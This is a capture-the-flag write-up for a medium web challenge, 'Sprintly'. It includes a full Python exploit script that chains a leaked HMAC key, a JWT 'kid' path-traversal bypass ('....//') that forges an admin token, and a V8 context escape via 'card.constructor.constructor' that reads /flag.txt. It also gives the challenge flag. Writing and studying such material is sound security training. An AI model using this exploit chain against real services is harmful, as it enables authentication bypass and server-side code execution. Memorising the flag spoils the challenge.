---
title: "Sprintly"
ctf: "Unknown"
date: 2026-10-10
category: web
difficulty: medium
points: 100
flag_format: "CTF{...}"
author: "Unknown"
---

# Sprintly

## Summary

Sprintly exposes its internal GraphQL operations in the client bundle. An authenticated member can read a board attachment containing an HMAC key; a flawed JWT `kid` path filter lets that attachment become the verification key for a forged admin token. The admin-only automation runner then escapes its V8 context through the host-realm `card` object.

## Solution

### Step 1: Enumerate the GraphQL application

`/app.js` documents `POST /graphql`, including registration, board queries, and the hidden admin automation mutations. Registering a normal account is enough to query board `1`. Its `PLAT-114` ticket discloses that JWT verification loads the `kid` from a key directory, and its attachments include a 20-byte file containing `secretkey1234567890\n`.

The traversal filter removes literal `../` once. The `kid` value `....//uploads/<attachment>` becomes `../uploads/<attachment>` after filtering, resolving the uploaded file outside the intended key directory.

### Step 2: Forge an admin token and escape automation

The following complete script registers a member, finds the leaked key attachment, forges an admin JWT that uses the traversal `kid`, creates an automation rule, and runs it against an existing card. It requires `requests`.

```python
#!/usr/bin/env python3
import base64
import hashlib
import hmac
import json
import secrets
import time

import requests

BASE = "http://43.204.115.83"


def b64url(value):
    if not isinstance(value, bytes):
        value = json.dumps(value, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(value).rstrip(b"=").decode()


def gql(query, variables=None, token=None):
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    response = requests.post(
        f"{BASE}/graphql", headers=headers,
        json={"query": query, "variables": variables or {}}, timeout=15,
    )
    response.raise_for_status()
    body = response.json()
    if body.get("errors"):
        raise RuntimeError(body["errors"])
    return body["data"]


# A normal account can query the Platform board and its attachments.
username = "solve" + secrets.token_hex(5)
member = gql(
    "mutation($u:String!,$d:String!,$p:String!){"
    "register(username:$u,displayName:$d,password:$p){token}}",
    {"u": username, "d": "solver", "p": "Sprintly!123"},
)["register"]["token"]

board = gql(
    "query($id:ID!){board(id:$id){cards{key attachments{filename url bytes}}}}",
    {"id": "1"}, member,
)["board"]

key_file = next(
    attachment
    for card in board["cards"]
    for attachment in card["attachments"]
    if attachment["bytes"] == 20
)
key = requests.get(BASE + key_file["url"], timeout=15).content

# `....//` bypasses the one-pass `../` removal, leaving ../uploads/<filename>.
header = {"alg": "HS256", "typ": "JWT", "kid": "....//uploads/" + key_file["filename"]}
now = int(time.time())
payload = {
    "sub": 1, "username": "sprintly-admin", "role": "admin",
    "iat": now, "exp": now + 3600, "iss": "sprintly",
}
signed = f"{b64url(header)}.{b64url(payload)}"
admin = signed + "." + b64url(hmac.new(key, signed.encode(), hashlib.sha256).digest())

expression = (
    "card.constructor.constructor('return process')()"
    ".mainModule.require('fs').readFileSync('/flag.txt','utf8')"
)
rule = gql(
    "mutation($n:String!,$e:String!){"
    "createAutomationRule(name:$n,expression:$e){id}}",
    {"n": "flag-read", "e": expression}, admin,
)["createAutomationRule"]

result = gql(
    "mutation($id:ID!,$key:String!){"
    "runAutomationRule(id:$id,cardKey:$key){ok result error}}",
    {"id": rule["id"], "key": "PLAT-114"}, admin,
)["runAutomationRule"]

print(result["result"])
```

The V8 context is not isolated from injected host objects: `card.constructor.constructor` returns a host-realm `Function`, which can return `process` and therefore load `fs`.

## Flag

```
CTF{k3y_1d_w4s_n3v3r_m34nt_t0_b3_4_f1l3_p4th}
```
